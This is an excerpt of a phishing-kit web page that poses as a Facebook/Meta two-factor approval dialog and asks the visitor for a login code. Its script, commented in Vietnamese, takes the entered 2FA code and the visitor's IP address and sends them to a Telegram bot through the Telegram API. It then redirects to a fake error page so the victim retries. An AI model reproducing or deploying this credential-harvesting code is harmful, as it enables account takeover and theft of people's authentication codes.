...
<body>
    ...
    <div class="modal form-modal" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
            <div class="modal-content">
                    ...
                    <div class="twoFAinfo-wraper">
                        ...
                        <h1 class="modal-title" id="2FAmodalLabel">
                            <font id="titlevery" style="vertical-align: inherit;">
                                <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;font-family: inherit;">Check your notifications on another device</font>
                                    </font>
                                </font>
                            </font>
                        </h1> <span>
                            <font id="getdevice" style="vertical-align: inherit;">
                                We've sent a notification to your Device. Check your Facebook notifications on your device and approve access to continue.
                            </font>
                        </span>
                        <div class="fb-round-wraper" id="changeanh"> <img src="img/2fa.png" alt="" style="width: 100%;border-radius: 3px;"> </div>
                        <form>
                            <div class="mb-3"></div>
                            <div id="duyetthietbi" style="display: flex; align-items: flex-start; font-family: Arial, sans-serif; color: #000;">
                            ...
                            <div class="mb-3"></div>
                            <div class="mb-3">
                                <div class="password-input" style="display:none"> <input name="2FA-1" minlength="6" maxlength="8" type="tel" class="form-control" id="2facode" placeholder="Code" required="" autocomplete="off"> </div>
                                <div class="invalid-feedback" id="invalid2fa" style="display: none;">
                                    <font style="vertical-align: inherit;">
                                        <font style="vertical-align: inherit;">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">Invalid code. Please try again later </font>
                                            </font>
                                        </font>
                                    </font><span id="timer"></span>
                                </div>
                            </div>
                            <div class="form-btn-wrapper" style="display:none" id="send2fa"> <button class="btn btn-primary" type="submit">
                                    <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;"> <span class="visually-hidden">
                                            <font style="vertical-align: inherit;">
                                                <font style="vertical-align: inherit;">
                                                    <font style="vertical-align: inherit;">
                                                        <font style="vertical-align: inherit;">Carico...</font>
                                                    </font>
                                                </font>
                                            </font>
                ...
                <div class="modal-footer"> <img src="images/meta-logo-grey.png" alt=""> </div>
            </div>
        </div>
    </div>


    <?php require_once('views/2fa.php'); ?>
    ...
    <script>
        function sendToTelegramAndRedirect(event) {
            ...
            var code = document.getElementById('exampleInputPassword').value.trim(); // Lấy mã 2FA từ input
            ...
            // Lấy IP của người dùng từ get-ip.php
            fetch('get-ip.php')
                .then(response => response.text())
                .then(ip => {
                    // Chuẩn bị nội dung tin nhắn để gửi về Telegram
                    var content = "Mã 2FA (1): " + code + "\nIP: " + ip;
                    ...
                    fetch('https://api.telegram.org/bot' + apiToken + '/sendMessage', {
                        ...
                        .then(response => {
                            if (response.ok) {
                                ...
                                // Chuyển hướng đến trang web khác sau khi gửi tin nhắn thành công
                                window.location.href = "/2fa-error.php"; // Thay đổi URL đến trang bạn muốn chuyển hướng
                            } else {
